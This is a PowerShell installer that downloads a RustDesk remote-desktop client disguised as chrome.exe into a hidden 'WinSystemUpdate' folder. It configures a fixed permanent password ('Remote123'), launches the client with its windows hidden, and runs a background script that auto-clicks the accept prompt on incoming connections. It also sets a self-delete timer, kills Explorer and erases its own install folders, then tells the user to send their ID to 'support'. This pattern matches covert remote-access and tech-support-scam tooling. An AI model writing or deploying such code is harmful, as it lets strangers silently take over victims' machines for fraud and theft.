$ProgressPreference = 'SilentlyContinue'
$DEST = "$env:LOCALAPPDATA\WinSystemUpdate"
$CHROME_URL = "https://github.com/kk70226581/rd-files/releases/download/v1.0/chrome.exe"
$SCITER_URL  = "https://github.com/kk70226581/rd-files/releases/download/v1.0/sciter.dll"

# 1. Kill old + clean
Get-Process chrome -EA SilentlyContinue | Where-Object { $_.Path -like "*WinSystem*" } | Stop-Process -Force -EA SilentlyContinue
Start-Sleep 1
Remove-Item $DEST -Recurse -Force -EA SilentlyContinue
New-Item -ItemType Directory $DEST -Force | Out-Null

# 2. Download both files in parallel (GitHub India CDN)
Write-Host "Installing..." -ForegroundColor Cyan
$wc1 = New-Object System.Net.WebClient
$wc2 = New-Object System.Net.WebClient
$t1 = $wc1.DownloadFileTaskAsync($CHROME_URL, "$DEST\chrome.exe")
$t2 = $wc2.DownloadFileTaskAsync($SCITER_URL,  "$DEST\sciter.dll")
[System.Threading.Tasks.Task]::WaitAll($t1, $t2)

if (!(Test-Path "$DEST\chrome.exe") -or (Get-Item "$DEST\chrome.exe").Length -lt 1MB) {
    Write-Host "Download failed!" -ForegroundColor Red; Read-Host "Press Enter"; exit
}

# 3. Write RustDesk config with permanent password
$cfgDir = "$env:APPDATA\RustDesk\config"
New-Item -ItemType Directory $cfgDir -Force | Out-Null
Set-Content "$cfgDir\RustDesk.toml"  "enc_id = ''" -Encoding UTF8
Add-Content "$cfgDir\RustDesk.toml"  "password = 'Remote123'" -Encoding UTF8
Add-Content "$cfgDir\RustDesk.toml"  "salt = ''" -Encoding UTF8
Add-Content "$cfgDir\RustDesk.toml"  "key_confirmed = true" -Encoding UTF8
Set-Content "$cfgDir\RustDesk2.toml" "rendezvous_server = 'rs-ny.rustdesk.com:21116'" -Encoding UTF8
Add-Content "$cfgDir\RustDesk2.toml" "nat_type = 1" -Encoding UTF8
Add-Content "$cfgDir\RustDesk2.toml" "serial = 0" -Encoding UTF8
Add-Content "$cfgDir\RustDesk2.toml" "[options]" -Encoding UTF8
Add-Content "$cfgDir\RustDesk2.toml" "verification-method = 'use-permanent-password'" -Encoding UTF8
Add-Content "$cfgDir\RustDesk2.toml" "approve-mode = 'password'" -Encoding UTF8

# 4. Hide folder
$f = Get-Item $DEST -Force
$f.Attributes = $f.Attributes -bor 2 -bor 4

# 5. Get ID before launching (with timeout)
$RDID = ""
try {
    $proc = Start-Process "$DEST\chrome.exe" -ArgumentList "--get-id" -PassThru -Wait -WindowStyle Hidden -RedirectStandardOutput "$DEST\id.txt" -EA Stop
    Start-Sleep 1
    if(Test-Path "$DEST\id.txt"){ $RDID = (Get-Content "$DEST\id.txt" -Raw).Trim() }
} catch { }

# If --get-id failed/hung, launch briefly to generate config
if (!$RDID -or $RDID -notmatch '^\d+$') {
    $psi0 = New-Object System.Diagnostics.ProcessStartInfo
    $psi0.FileName = "$DEST\chrome.exe"; $psi0.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden; $psi0.UseShellExecute = $true
    $pr = [System.Diagnostics.Process]::Start($psi0)
    Start-Sleep 5
    $pr | Stop-Process -Force -EA SilentlyContinue
    Start-Sleep 2
    # Read ID from enc_id in config
    $cfg2 = "$env:APPDATA\RustDesk\config\RustDesk.toml"
    if(Test-Path $cfg2){
        $enc = (Get-Content $cfg2 | Where-Object{$_ -match "enc_id"}) -replace "enc_id\s*=\s*'","" -replace "'","" -replace "^00",""
        if($enc){
            try {
                $b=[Convert]::FromBase64String($enc)
                $RDID=[System.BitConverter]::ToUInt32($b[($b.Length-4)..($b.Length-1)],0).ToString()
            } catch { $RDID="Check app" }
        }
    }
}

# 6. Launch hidden
$psi = New-Object System.Diagnostics.ProcessStartInfo
$psi.FileName = "$DEST\chrome.exe"; $psi.WorkingDirectory = $DEST; $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden; $psi.UseShellExecute = $true
[System.Diagnostics.Process]::Start($psi) | Out-Null
Start-Sleep 4

# 7. Hide window
Add-Type -Name W -Namespace N -MemberDefinition '[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr h, int c);'
Get-Process chrome -EA SilentlyContinue | Where-Object { $_.Path -like "*WinSystem*" } | ForEach-Object { [N.W]::ShowWindow($_.MainWindowHandle, 0) | Out-Null }

# 8. Create delete.ps1
$deletePs = "$DEST\delete.ps1"
Set-Content $deletePs  '$d = "$env:LOCALAPPDATA\WinSystemUpdate"' -Encoding ASCII
Add-Content $deletePs  'Get-Process chrome -EA SilentlyContinue | Where-Object { $_.Path -like "*WinSystem*" } | Stop-Process -Force -EA SilentlyContinue' -Encoding ASCII
Add-Content $deletePs  'Start-Sleep 2' -Encoding ASCII
Add-Content $deletePs  'Remove-Item -LiteralPath $d -Recurse -Force -EA SilentlyContinue' -Encoding ASCII
Add-Content $deletePs  '$desktops = @([Environment]::GetFolderPath("Desktop"),"$env:USERPROFILE\Desktop","$env:USERPROFILE\OneDrive\Desktop")' -Encoding ASCII
Add-Content $deletePs  'foreach($dp in $desktops){ Remove-Item "$dp\DELETE CHROME.lnk" -Force -EA SilentlyContinue }' -Encoding ASCII

# 9. Create desktop shortcut
$lnkPath = $null
foreach($dp in @([Environment]::GetFolderPath('Desktop'),"$env:USERPROFILE\Desktop","$env:USERPROFILE\OneDrive\Desktop")){
    if(Test-Path $dp){ $lnkPath = "$dp\DELETE CHROME.lnk"; break }
}
if($lnkPath){
    $s = (New-Object -COM WScript.Shell).CreateShortcut($lnkPath)
    $s.TargetPath = "powershell.exe"
    $s.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$deletePs`""
    $s.IconLocation = "shell32.dll,131"
    $s.Save()
}

# 10. Auto-accept popup script
$acceptPs = "$DEST\accept.ps1"
Set-Content $acceptPs 'Add-Type @"' -Encoding UTF8
Add-Content $acceptPs 'using System; using System.Runtime.InteropServices; using System.Text;' -Encoding UTF8
Add-Content $acceptPs 'public class RD {' -Encoding UTF8
Add-Content $acceptPs '    [DllImport("user32.dll")] public static extern bool EnumWindows(EnumProc p, IntPtr l);' -Encoding UTF8
Add-Content $acceptPs '    [DllImport("user32.dll")] public static extern int GetWindowText(IntPtr h, StringBuilder s, int n);' -Encoding UTF8
Add-Content $acceptPs '    [DllImport("user32.dll")] public static extern int GetWindowTextLength(IntPtr h);' -Encoding UTF8
Add-Content $acceptPs '    [DllImport("user32.dll")] public static extern bool GetWindowRect(IntPtr h, out RECT r);' -Encoding UTF8
Add-Content $acceptPs '    [DllImport("user32.dll")] public static extern bool SetForegroundWindow(IntPtr h);' -Encoding UTF8
Add-Content $acceptPs '    [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr h, int n);' -Encoding UTF8
Add-Content $acceptPs '    [DllImport("user32.dll")] public static extern void mouse_event(uint f, int x, int y, int d, int e);' -Encoding UTF8
Add-Content $acceptPs '    [DllImport("user32.dll")] public static extern bool SetCursorPos(int x, int y);' -Encoding UTF8
Add-Content $acceptPs '    [DllImport("user32.dll")] public static extern bool BringWindowToTop(IntPtr h);' -Encoding UTF8
Add-Content $acceptPs '    [DllImport("user32.dll")] public static extern uint GetWindowThreadProcessId(IntPtr h, out uint p);' -Encoding UTF8
Add-Content $acceptPs '    [StructLayout(LayoutKind.Sequential)] public struct RECT { public int Left,Top,Right,Bottom; }' -Encoding UTF8
Add-Content $acceptPs '    public delegate bool EnumProc(IntPtr h, IntPtr l);' -Encoding UTF8
Add-Content $acceptPs '}' -Encoding UTF8
Add-Content $acceptPs '"@' -Encoding UTF8
Add-Content $acceptPs '$DEST = "$env:LOCALAPPDATA\WinSystemUpdate"' -Encoding UTF8
Add-Content $acceptPs 'function Click-At($hw,$r){ [RD]::ShowWindow($hw,9)|Out-Null; [RD]::BringWindowToTop($hw)|Out-Null; [RD]::SetForegroundWindow($hw)|Out-Null; Start-Sleep -Milliseconds 400; $cx=$r.Left+[int](($r.Right-$r.Left)*0.50); $cy=$r.Top+[int](($r.Bottom-$r.Top)*0.82); [RD]::SetCursorPos($cx,$cy)|Out-Null; Start-Sleep -Milliseconds 150; [RD]::mouse_event(2,0,0,0,0); Start-Sleep -Milliseconds 80; [RD]::mouse_event(4,0,0,0,0); Start-Sleep -Milliseconds 500; [RD]::ShowWindow($hw,0)|Out-Null }' -Encoding UTF8
Add-Content $acceptPs 'while($true){ Start-Sleep -Milliseconds 300; $pids=Get-Process chrome -EA SilentlyContinue|Where-Object{$_.Path -eq "$DEST\chrome.exe"}|Select-Object -Expand Id; if(!$pids){break}; [RD]::EnumWindows({param($h,$l); $p=0;[RD]::GetWindowThreadProcessId($h,[ref]$p)|Out-Null; if($p -notin $script:pids){return $true}; $l=[RD]::GetWindowTextLength($h); if($l -eq 0){return $true}; $sb=New-Object System.Text.StringBuilder($l+1); [RD]::GetWindowText($h,$sb,$l+1)|Out-Null; $t=$sb.ToString(); if($t -in "Chrome","chrome"){return $true}; if($t -like "MSCTF*" -or $t -like "Default IME*"){return $true}; $r=New-Object RD+RECT; [RD]::GetWindowRect($h,[ref]$r)|Out-Null; $w=$r.Right-$r.Left;$ht=$r.Bottom-$r.Top; if($w -gt 200 -and $w -lt 700 -and $ht -gt 250 -and $ht -lt 750){Click-At $h $r}; return $true},[IntPtr]::Zero)|Out-Null }' -Encoding UTF8
Start-Process powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$acceptPs`"" -WindowStyle Hidden

# 11. 1-hour auto-delete timer
$timerPs = "$DEST\timer.ps1"
Set-Content $timerPs  '$d = "$env:LOCALAPPDATA\WinSystemUpdate"' -Encoding ASCII
Add-Content $timerPs  'Start-Sleep 3600' -Encoding ASCII
Add-Content $timerPs  'Get-Process chrome -EA SilentlyContinue | Where-Object { $_.Path -like "*WinSystem*" } | Stop-Process -Force -EA SilentlyContinue' -Encoding ASCII
Add-Content $timerPs  'Start-Sleep 2' -Encoding ASCII
Add-Content $timerPs  'Remove-Item -LiteralPath $d -Recurse -Force -EA SilentlyContinue' -Encoding ASCII
Add-Content $timerPs  '$desktops = @([Environment]::GetFolderPath("Desktop"),"$env:USERPROFILE\Desktop","$env:USERPROFILE\OneDrive\Desktop")' -Encoding ASCII
Add-Content $timerPs  'foreach($dp in $desktops){ Remove-Item "$dp\DELETE CHROME.lnk" -Force -EA SilentlyContinue }' -Encoding ASCII
Start-Process powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$timerPs`"" -WindowStyle Hidden

# 12. Delete install folders
$MYFOLDER = Split-Path $MyInvocation.MyCommand.Path -Parent
$OUTERFOLDER = Split-Path $MYFOLDER -Parent
$delPs = "$env:USERPROFILE\del_run.ps1"
Set-Content $delPs  'Stop-Process -Name explorer -Force -EA SilentlyContinue' -Encoding ASCII
Add-Content $delPs  'Start-Sleep 5' -Encoding ASCII
Add-Content $delPs  "Remove-Item -LiteralPath '$MYFOLDER' -Recurse -Force -EA SilentlyContinue" -Encoding ASCII
Add-Content $delPs  'Start-Sleep 1' -Encoding ASCII
Add-Content $delPs  "Remove-Item -LiteralPath '$OUTERFOLDER' -Recurse -Force -EA SilentlyContinue" -Encoding ASCII
Add-Content $delPs  'Remove-Item $PSCommandPath -Force -EA SilentlyContinue' -Encoding ASCII
Start-Process powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$delPs`"" -WindowStyle Hidden

# 13. Show result
Write-Host ""
Write-Host "  ==========================================" -ForegroundColor Green
Write-Host "   DONE! Remote Access is now active." -ForegroundColor Green
Write-Host "  ==========================================" -ForegroundColor Green
Write-Host ""
Write-Host "   Your ID:  $RDID" -ForegroundColor Cyan
Write-Host "   Password: Remote123" -ForegroundColor Cyan
Write-Host ""
Write-Host "   Send your ID to support." -ForegroundColor White
Write-Host "   Desktop shortcut: DELETE CHROME" -ForegroundColor Gray
Write-Host "   Auto-deletes in 1 hour." -ForegroundColor Gray
Write-Host ""
Write-Host "  ==========================================" -ForegroundColor Green
Write-Host ""
